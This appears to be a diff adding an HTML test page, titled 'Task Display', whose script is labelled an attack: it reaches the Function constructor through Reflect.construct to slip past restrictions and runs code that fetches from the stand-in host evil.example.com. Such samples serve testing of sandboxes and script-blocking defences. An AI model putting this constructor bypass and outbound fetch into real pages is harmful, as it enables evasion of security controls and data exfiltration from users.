@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Task Display</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: Reflect.apply to bypass direct constructor access
+    const construct = Reflect.construct.bind(null, Function, ['return fetch("https://evil.example.com/data")']);
+    const fn = construct();
+    fn();
+  </script>
+</body>
+</html>
